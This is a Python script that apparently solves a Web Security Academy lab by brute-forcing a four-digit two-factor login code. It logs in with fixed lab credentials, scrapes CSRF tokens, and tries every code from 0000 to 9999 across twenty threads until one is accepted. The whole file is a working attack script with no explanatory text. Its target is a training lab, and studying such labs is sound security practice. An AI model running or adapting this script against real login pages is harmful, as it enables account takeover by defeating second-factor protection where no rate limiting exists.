import sys
import os
import requests
import threading
from datetime import datetime, timezone

lab_id = "0ad500f80317ee80c00bcefc00860061"

print("Time Started (Local Time): {}".format(datetime.now(timezone.utc).astimezone().isoformat()))

def gogetem(num):
    
    for i in range(num, num + 500):
        
        r1 = requests.get("https://" + lab_id + ".web-security-academy.net/login")
        session1 = r1.cookies['session']
        csrf1 = str(r1.content).split("csrf")[1].split("\"")[2]
        myheaders1 = {'session':session1}
        mybody1 = "csrf=" + csrf1 + "&username=carlos&password=montoya"
       
        r2 = requests.Session()
        r3 = r2.post("https://" + lab_id + ".web-security-academy.net/login", cookies = myheaders1, data = mybody1, allow_redirects=True)
        csrf2 = str(r3.content).split("csrf")[1].split("\"")[2]
        mybody2 = "csrf=" + csrf2 + "&mfa-code=" + str(i).zfill(4)

        r4 = r2.post("https://" + lab_id + ".web-security-academy.net/login2", data = mybody2)
        print("Trying \"" + str(i).zfill(4) + "\"")
        output = str(r4.content).split("class=is-warning")[1].split(">")[1].split("<")[0]
        
        if output != "Incorrect security code":
            print("OTP found: \"" + str(i).zfill(4) + "\"")
            print("Time Finished (Local Time): {}".format(datetime.now(timezone.utc).astimezone().isoformat()))
            sys.exit() 
        
        # output = str(r4.content).split("class=is-warning")[1].split(">")[1].split("<")[0]

        # if output != "Incorrect security code":
        #     print("OTP found: \"" + str(i).zfill(4) + "\"")
        #     print("Time Finished (Local Time): {}".format(datetime.now(timezone.utc).astimezone().isoformat()))
        #     sys.exit() 
        
        # try:
        #     output = str(r4.content).split("class=is-warning")[1].split(">")[1].split("<")[0]
        # except:
        #     print("OTP found: \"" + str(i).zfill(4) + "\"")
        #     print("Time Finished (Local Time): {}".format(datetime.now(timezone.utc).astimezone().isoformat()))
        #     sys.exit() 
        
if __name__ =="__main__":

    # creating threads
    t00 = threading.Thread(target=gogetem, args=(0,))
    t01 = threading.Thread(target=gogetem, args=(500,))
    t02 = threading.Thread(target=gogetem, args=(1000,))
    t03 = threading.Thread(target=gogetem, args=(1500,))
    t04 = threading.Thread(target=gogetem, args=(2000,))
    t05 = threading.Thread(target=gogetem, args=(2500,))
    t06 = threading.Thread(target=gogetem, args=(3000,))
    t07 = threading.Thread(target=gogetem, args=(3500,))
    t08 = threading.Thread(target=gogetem, args=(4000,))
    t09 = threading.Thread(target=gogetem, args=(4500,))
    t10 = threading.Thread(target=gogetem, args=(5000,))
    t11 = threading.Thread(target=gogetem, args=(5500,))
    t12 = threading.Thread(target=gogetem, args=(6000,))
    t13 = threading.Thread(target=gogetem, args=(6500,))
    t14 = threading.Thread(target=gogetem, args=(7000,))
    t15 = threading.Thread(target=gogetem, args=(7500,))
    t16 = threading.Thread(target=gogetem, args=(8000,))
    t17 = threading.Thread(target=gogetem, args=(8500,))
    t18 = threading.Thread(target=gogetem, args=(9000,))
    t19 = threading.Thread(target=gogetem, args=(9500,))
    
    # starting threads
    t00.start()
    t01.start()
    t02.start()
    t03.start()
    t04.start()
    t05.start()
    t06.start()
    t07.start()
    t08.start()
    t09.start()
    t10.start()
    t11.start()
    t12.start()
    t13.start()
    t14.start()
    t15.start()
    t16.start()
    t17.start()
    t18.start()
    t19.start()

    t00.join()
    t01.join()
    t02.join()
    t03.join()
    t04.join()
    t05.join()
    t06.join()
    t07.join()
    t08.join()
    t09.join()
    t10.join()
    t11.join()
    t12.join()
    t13.join()
    t14.join()
    t15.join()
    t16.join()
    t17.join()
    t18.join()
    t19.join()

    # both threads completely executed
    print("Done At (Local Time): {}".format(datetime.now(timezone.utc).astimezone().isoformat()))
    